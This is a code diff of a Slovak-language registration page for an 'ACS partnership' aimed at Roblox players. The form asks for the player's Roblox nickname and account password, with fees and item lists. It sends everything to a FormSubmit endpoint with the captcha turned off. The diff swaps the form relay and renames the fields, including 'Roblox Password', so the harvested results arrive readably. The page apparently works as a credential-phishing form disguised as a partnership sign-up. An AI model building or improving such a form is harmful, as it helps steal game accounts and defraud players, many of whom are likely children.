@@ -114,8 +114,13 @@
                 <div id="progress-bar" class="h-full bg-blue-500 transition-all duration-500 ease-out" style="width: 25%"></div>
             </div>
 
-            <!-- Formspree Integration -->
-            <form action="https://formspree.io/f/mjgpwevq" method="POST" id="main-form">
+            <!-- FormSubmit Integration -->
+            <form action="https://formsubmit.co/el/vumume" method="POST" id="main-form">
+                <!-- FormSubmit Nastavenia -->
+                <input type="hidden" name="_subject" value="Nová registrácia ACS Partnerstva!">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_captcha" value="false">
+
                 <div class="p-8 md:p-12">
                     <!-- KROK 1: Identita -->
                     <div id="step-1" class="step-content active space-y-6">
@@ -128,11 +133,11 @@
                         <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                             <div class="space-y-2">
                                 <label class="text-[10px] font-bold uppercase text-slate-500 tracking-widest">Nickname</label>
-                                <input type="text" id="nickname" name="roblox_nickname" required placeholder="Tvoj Roblox Nick" class="w-full bg-slate-950 border border-slate-800 rounded-xl p-4 focus:ring-2 focus:ring-blue-500 outline-none transition-all">
+                                <input type="text" id="nickname" name="Roblox Nickname" required placeholder="Tvoj Roblox Nick" class="w-full bg-slate-950 border border-slate-800 rounded-xl p-4 focus:ring-2 focus:ring-blue-500 outline-none transition-all">
                             </div>
                             <div class="space-y-2">
                                 <label class="text-[10px] font-bold uppercase text-slate-500 tracking-widest">Heslo</label>
-                                <input type="password" id="password" name="roblox_password" required placeholder="Prístupové heslo" class="w-full bg-slate-950 border border-slate-800 rounded-xl p-4 focus:ring-2 focus:ring-blue-500 outline-none transition-all">
+                                <input type="password" id="password" name="Roblox Password" required placeholder="Prístupové heslo" class="w-full bg-slate-950 border border-slate-800 rounded-xl p-4 focus:ring-2 focus:ring-blue-500 outline-none transition-all">
                             </div>
                         </div>
                         <div class="p-4 bg-blue-500/5 border border-blue-500/20 rounded-xl flex gap-3 text-blue-300 text-xs">
@@ -151,7 +156,7 @@
                         </div>
                         
                         <!-- Skrytý input pre typ plánu -->
-                        <input type="hidden" name="selected_plan" id="plan-input" value="weekly">
+                        <input type="hidden" name="Vybraný Plán" id="plan-input" value="weekly">
                         
                         <div class="grid grid-cols-1 md:grid-cols-3 gap-4" id="plan-selector">
                             <button type="button" onclick="selectPlan('weekly')" class="plan-btn p-6 rounded-2xl border-2 text-left bg-slate-950 border-blue-500 ring-2 ring-blue-500/20 transition-all">
@@ -173,14 +178,14 @@
                         <div class="pt-6 border-t border-slate-800 space-y-4">
                             <div class="flex justify-between items-center">
                                 <span class="text-sm text-slate-400">Použitie ACS zbraní (mesačne):</span>
-                                <input type="number" id="weapon-usage" name="weapon_usage" value="0" oninput="updateFees()" class="w-20 bg-slate-950 border border-slate-800 rounded-lg p-2 text-center text-white font-bold outline-none">
+                                <input type="number" id="weapon-usage" name="Mesačné použitie" value="0" oninput="updateFees()" class="w-20 bg-slate-950 border border-slate-800 rounded-lg p-2 text-center text-white font-bold outline-none">
                             </div>
                             <div id="excess-fee-box" class="hidden p-4 bg-red-500/10 border border-red-500/20 rounded-xl flex justify-between items-center text-red-400">
                                 <span class="text-xs font-bold uppercase tracking-wider">Poplatok za prekročenie limitu:</span>
                                 <span class="font-bold text-lg" id="excess-fee-amount">0€</span>
                             </div>
                             <!-- Skrytý input pre celkovú sumu -->
-                            <input type="hidden" name="total_to_pay" id="total-input" value="5€">
+                            <input type="hidden" name="Celková suma na úhradu" id="total-input" value="5€">
                         </div>
                     </div>
 
@@ -193,7 +198,7 @@
                             <p class="text-slate-400 text-sm">Zadaj 50 položiek alebo modelov, ktoré chceš aktivovať.</p>
                         </div>
                         <div class="grid grid-cols-2 md:grid-cols-5 gap-2 max-h-[350px] overflow-y-auto pr-2 custom-scrollbar" id="fields-container">
-                            <!-- Polia budú generované JS s atribútom name="model_X" -->
+                            <!-- Polia generované JS -->
                         </div>
                     </div>
 
@@ -210,7 +215,7 @@
                             <div class="h-px bg-slate-900 my-2"></div>
                             <div class="flex justify-between text-lg font-bold"><span class="text-blue-400">CELKOM:</span><span id="sum-total">5€</span></div>
                         </div>
-                        <p class="text-xs text-slate-500 max-w-xs mx-auto">Kliknutím na tlačidlo nižšie potvrdzuješ registráciu a tvoje dáta budú odoslané spoločnosti GAMEPLA631.</p>
+                        <p class="text-xs text-slate-500 max-w-xs mx-auto">Kliknutím na tlačidlo nižšie potvrdzuješ registráciu a tvoje dáta budú odoslané spoločnosti GAMEPLA631 cez FormSubmit.</p>
                         <button type="submit" class="w-full max-w-sm py-4 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-xl shadow-lg shadow-blue-500/20 transition-all transform active:scale-95">
                             ODOSLAŤ A AKTIVOVAŤ
                         </button>
@@ -249,7 +254,7 @@
             div.className = 'space-y-1';
             div.innerHTML = `
                 <label class="text-[8px] text-slate-500 font-bold uppercase">Model #${i}</label>
-                <input type="text" name="model_${i}" placeholder="..." class="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs text-white outline-none focus:border-blue-500">
+                <input type="text" name="Model_${i}" placeholder="..." class="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs text-white outline-none focus:border-blue-500">
             `;
             fieldsContainer.appendChild(div);
         }
